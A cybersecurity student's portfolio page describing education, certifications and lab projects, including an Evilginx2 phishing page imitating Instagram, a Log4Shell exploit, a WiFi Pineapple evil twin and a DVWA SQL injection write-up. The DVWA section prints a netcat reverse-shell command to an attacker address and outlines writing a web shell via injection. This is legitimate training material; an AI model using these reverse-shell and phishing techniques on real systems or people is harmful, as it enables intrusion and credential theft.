# Michael Kuo
*Cybersecurity Engineer | Aspiring Pentester | <a href="https://github.com/Speedycray">Github</a> | <a href="https://www.linkedin.com/in/michaelpkuo/">LinkedIn</a>*





# Education
* Cyber Defense Professional Certificate, *University of Central Florida*, 2021-2022
* Bachelors of Science (Computer Science), *University of Central Florida*, 2019-2021
* Minor (Secure Computing and Networking), *University of Central Florida*, 2019-2021
* Associates (Computer Science), *Valencia College*, 2017-2019

# Certifications
* <a href="https://www.credly.com/badges/652d7951-fd54-41da-935c-ab0267109e68/public_url" target="_blank">AWS Certified Cloud Practitioner 2023-2026</a>
* <a href="https://raw.githubusercontent.com/Speedycray/portfolio/main//CompTIA%20Network%2B%20ce%20certificate-1.png" target="_blank">CompTIA Network+ 2022-2025</a>
* <a href="https://badgr.com/public/assertions/W6z9tAapSb2JPo61Nl0NIQ" target="_blank">Cyber Security Professional</a>
* <a href="https://raw.githubusercontent.com/Speedycray/portfolio/main/Security%2B.png" target="_blank">CompTIA Security+ 2021-2024</a>
* <a href="https://badgr.com/public/assertions/wYLDfk1PQUSxuRVRaUuFBA" target="_blank">Basic Computer Skills 2021</a>

<!---
* [CompTIA Network+ 2022-2025](https://raw.githubusercontent.com/Speedycray/portfolio/main//CompTIA%20Network%2B%20ce%20certificate-1.png)
* [Cyber Security Professional](https://badgr.com/public/assertions/W6z9tAapSb2JPo61Nl0NIQ)
* [CompTIA Security+ 2021-2024](https://raw.githubusercontent.com/Speedycray/portfolio/main/Security%2B.png)
* [Basic Computer Skills 2021](https://badgr.com/public/assertions/wYLDfk1PQUSxuRVRaUuFBA)
-->



# Projects:

# [Evilginx2](https://github.com/kgretzky/evilginx2)
![alt text](evilginx.png)
 
Using Evilginx2 I was able to familiarize myself with this man-in-the-middle framework used for phishing login credentials. I used DigitalOcean to host the generated fake login page using a domain similar to one of Instagram's.

### **Reources:**
*  [Youtube Tutorial](https://www.youtube.com/watch?v=hkLmuXhrizU)

### **Skills:** 
*  DigitalOcean
*  Man-in-the-Middle
*  Phishing

### **Results:**
*  Hosted fake Instagram Website domain which would redirect users to the real Instagram after logging in.
*  Captured user inputted credentials.


# [Log4Shell - Java's Log4J](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
![alt text](pexels-pranjall-kumar-8464466.jpg)


Photo by 
 <a href="https://www.pexels.com/@pranjall-kumar-150768">
   Photo by Pranjall Kumar
 </a> on 
 <a href="https://www.pexels.com/photo/coffee-beans-in-white-ceramic-mug-8464466/">
   Pexels
 </a>
 
Log4Shell is a vulnerability in the Java's Log4j. I hosted an exploit through a webserver with python3, Set up an LDAP listener to point to that server/exploit, and exploited Log4J's JNDI feature within Apache Solr to obtain a reverse powershell from the victim.

### **Reources:**
*  [TryHackMe](https://tryhackme.com/room/solar)
*  [Installing Apache Solr](https://www.youtube.com/watch?v=Km81Zsd7Dx8)
*  [John Hammond Log4J video](https://www.youtube.com/watch?v=7qoPDq41xhQ&t=967s)

### **Skills:** 
*  Set up attacker (Kali) and (Windows) victim virtual machines
*  Installed older version of Java
*  Obfuscated and utilized reverse powershell one-liner
*  Installed Java builder Maven
*  Set up Netcat listener for reverse shell session

### **Results:**
*  Able to open any application through victim's command prompt
*  Opened reverse powershell in attacker machine
*  Implemented [Threatlocker](https://www.threatlocker.com/) security software to stop the reverse shell

# [WiFi Pineapple](https://shop.hak5.org/products/wifi-pineapple)
![alt text](phoenix-han-ZS_RypKo9sk-unsplash.jpg)

Photo by 
  <a href="https://unsplash.com/@phienix_han?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText">Phoenix Han</a> 
  on 
  <a href="https://unsplash.com/photos/ZS_RypKo9sk">Unsplash</a>
 
Hak5 sells hacker tools and creates content for pentesters and those in cyber security. One of their producs is the WiFi Pineapple. This tool allows a penetration tester to audit the wireless network. It also can be used to perform offensive attacks such as deauthentication and dissassocations, man-in-the-middle, evil twin, and more. In this project I was able to use the WiFi Pineapple to set up an evil twin and captive portal. I would perform dissasociation attack on an access point and having clients associate to the evil twin.

### **Resources:**
* [WiFi Pineapple Documentation](https://docs.hak5.org/wifi-pineapple/)

### **Skills:**
* Set up a WiFi Pineapple
* Learned about deauthentication and dissassociation
* Learned about associating a client using PineAP

### **Result:**
* Kicked off everyone from the network and reassociated them to the WiFi Pineapple to be able to capture credentials in the captive portal.


# Instagram Bot
![alt text](instagram.jpeg)

Photo by <a href="https://unsplash.com/@alexbemore?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText">Alexander Shatov</a> on <a href="https://unsplash.com/s/photos/instagram?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText">Unsplash</a>

From an Instagram page, a user can see a list of "Followers" and "Followings". From the "Followers" list, the user can also see who they do not follow back. However, there is not a way for the user to know who does not follow the user back. I created a bot using Python and Selenium to fix this problem. Selenium is used for automated web-based application testing which was used to open and navigate through instagram. It would create a list of usernames from the "Followers" listing and another list from the "Following" listing. To get the list of usernames that do not follow the user back, both lists are compared to each other. Whatever is in the "Following" listing but not the "Followers" listing, would be the users that do not follow the user back.

### **Reources:**
*  <a href="https://www.youtube.com/watch?v=d2GBO_QjRlo" target="_blank">Building a simple Instagram bot with Python tutorial</a>

### **Skills:** 
*  Python
*  Selenium
*  Automated web-application testing

### **Results:**
*  Successfully created a bot that retrieves the usernames of those who do not follow the user back.

<a href="https://github.com/Speedycray/InstagramBot">Github Link</a>


# Sudoku Solver
![alt text](sudoku.jpeg)

Photo by 
  <a href="https://pixabay.com/users/ben_kerckx-69781/">Ben_Kerckx</a> 
  on 
  <a href="https://pixabay.com/images/id-2040676/">Pixabay</a>
 
As a big fan of sudoku, I spent hours solving these puzzles in my free time. This project caught my attention and I enjoyed working on it. Following the tutorial, I used Python to write some functions that checks which cells on the sudoku board are empty, another to check which numbers are valid in the empty cell, and another for backtracking if the board becomes invalid.

### **Resources:**
* <a href="https://www.techwithtim.net/tutorials/python-programming/sudoku-solver-backtracking/">Python Sudoku Solver Tutorial with Backtracking</a>

### **Skills:**
* Python
* Backtracking

### **Result:**
* successfully created a python script that solves a sudoku board using backtracking.

<a href="https://github.com/Speedycray/Sudoku-Solver">Github Link</a>



# [DVWA](https://github.com/digininja/DVWA)
![alt text](dvwa.jpeg)

Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is vulnerable. I was able to perform a reverse shell via SQL Injection in the app. I pulled a DVWA Docker image into my Kali Linux VM where I was able to access DVWA in a premade environment. DVWA has a section for practicing SQL injections and the option to set the difficulty from Low to Impossible. To demonstrate Proof of Concept, I performed the attack on Low security. 

Firstly, I tested to see if inputting a single quotation mark will return an error. Sure enough, it does. Now I've confirmed that this is vulnerable to SQL Injections. Next I used the 'order by' operator to confirm the amount of columns, in this case it was 2 since running "' order by 3 #' returned an error. This is important as it will help format the following injection. I used the UNION operator to inject a PHP script into a file within the root folder of the server which allowed us to access it via URL. Now from the URL, I could access the shell VIA URL.

To get a reverse shell from the server, I set up a Netcat listener on my attacking machine "nc -lvp 1234" listening on port 1234. From the URL where we had access to the shell, I sent the command, "nc 172.16.1.100 1234 -e /bin/sh" and that returned a reverse shell back to the Netcat Listener. Now I had control of the server!

I did encounter a permissions error when trying to write a file to the server. When running that injection, I got an access denied error from MySQL where the current user did not have enough permissions. To resolve this, I needed to login to the docker container and go into MySQL as root. I then ran the command to grant all permissions to the user. This fixed the issue!

### **Reources:**
*  [Github](https://github.com/digininja/DVWA)
*  [Docker Image](https://hub.docker.com/r/vulnerables/web-dvwa/)
*  [Use SQL Injection to Run OS Commands & Get a Shell](https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/)

### **Skills:** 
*  Docker
*  MySQL / Apache2
*  SQL Injection / Command Injection
*  PHP Script
*  Netcat

### **Results:**
*  Performed SQL Injections and Command Injections returning valuable information
*  Able to run shell commands through URL of vulnerable site
*  Opened reverse shell in attacking machine






















<!---

### Markdown

Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
 
```markdown
Syntax highlighted code block

# Header 1
## Header 2
### Header 3

- Bulleted
- List

1. Numbered
2. List

**Bold** and _Italic_ and `Code` text

[Link](url) and ![Image](src)
```

-->
